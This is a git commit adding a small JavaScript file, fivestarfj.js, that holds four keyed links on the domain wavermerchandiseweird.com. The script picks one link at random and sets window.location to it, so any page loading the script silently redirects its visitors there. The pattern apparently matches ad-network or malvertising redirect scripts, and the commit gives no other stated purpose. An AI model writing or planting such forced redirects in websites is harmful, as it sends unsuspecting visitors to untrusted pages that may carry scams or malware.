58d0bdb8ac25748776e6e323d77760afa86efea5
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2022-02-17 19:42:20 -0600

    Create fivestarfj.js

---
+++ fivestarfj.js
@@ -0,0 +1,8 @@
+var dataUrl = [
+'//wavermerchandiseweird.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
+'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'//wavermerchandiseweird.com/qqqysyvbg?key=1d3303b4d7decb61514e9d25a740edfe',
+'//wavermerchandiseweird.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
